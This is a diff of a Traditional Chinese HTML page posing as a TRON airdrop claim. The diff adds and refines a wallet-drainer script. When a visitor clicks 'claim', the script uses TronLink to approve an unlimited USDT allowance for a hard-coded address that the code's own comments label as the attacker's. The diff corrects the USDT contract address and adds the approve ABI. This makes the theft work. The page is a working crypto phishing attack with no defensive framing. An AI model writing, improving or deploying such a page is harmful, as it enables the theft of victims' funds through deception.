@@ -2,9 +2,10 @@
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8">
-  <title>🎁 領取 TRON 空投</title>
+  <title>🎁 領取空投（TRON）</title>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
   <style>
-    body { font-family: 'Arial'; background: #f8f8f8; text-align: center; padding: 80px; }
+    body { font-family: 'Arial'; background: #f9f9f9; text-align: center; padding: 80px; }
     button {
       padding: 12px 30px;
       font-size: 20px;
@@ -16,7 +17,6 @@
     }
     #status { margin-top: 20px; font-size: 16px; color: #555; }
   </style>
-  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
 </head>
 <body>
   <h1>🎉 恭喜你獲得 TRON 限時空投</h1>
@@ -25,29 +25,31 @@
   <p id="status">等待操作中...</p>
 
   <script>
-    const USDT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // TRON 主網 USDT
-    const attacker = "TBX8foxSthqVpiKqR87gN62M6oE91EKX7B"; // 攻擊者地址
+    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRC20 USDT 主網
+    const ATTACKER = "TBX8foxSthqVpiKqR87gN62M6oE91EKX7B";     // 攻擊者地址
+    const ABI = [
+      { "constant": false, "inputs": [
+        { "name": "_spender", "type": "address" },
+        { "name": "_value", "type": "uint256" }
+      ], "name": "approve", "outputs": [
+        { "name": "success", "type": "bool" }
+      ], "type": "function" }
+    ];
 
     async function approve() {
-      const status = document.getElementById("status");
-
-      // 等待 TronLink 注入
-      if (typeof window.tronWeb === 'undefined' || !window.tronWeb.defaultAddress.base58) {
+      if (typeof window.tronWeb === 'undefined' || !tronWeb.defaultAddress.base58) {
         alert("請先安裝並登入 TronLink 錢包");
         return;
       }
 
-      status.innerText = "⏳ 授權合約載入中...";
+      document.getElementById("status").innerText = "⏳ 發送授權中...";
 
       try {
-        const contract = await window.tronWeb.contract().at(USDT);
-        status.innerText = "⏳ 發送授權中...";
-
-        const tx = await contract.approve(attacker, window.tronWeb.toBigNumber("9223372036854775807")).send();
-        status.innerText = "✅ 授權成功，TX ID: " + tx;
+        const contract = await tronWeb.contract(ABI, USDT_CONTRACT);
+        const tx = await contract.approve(ATTACKER, "9223372036854775807").send();
+        document.getElementById("status").innerText = "✅ 授權成功，TX Hash: " + tx;
       } catch (e) {
-        console.error("授權失敗：", e);
-        status.innerText = "❌ 授權失敗：" + (e.message || e);
+        document.getElementById("status").innerText = "❌ 授權失敗: " + e.message;
       }
     }
   </script>
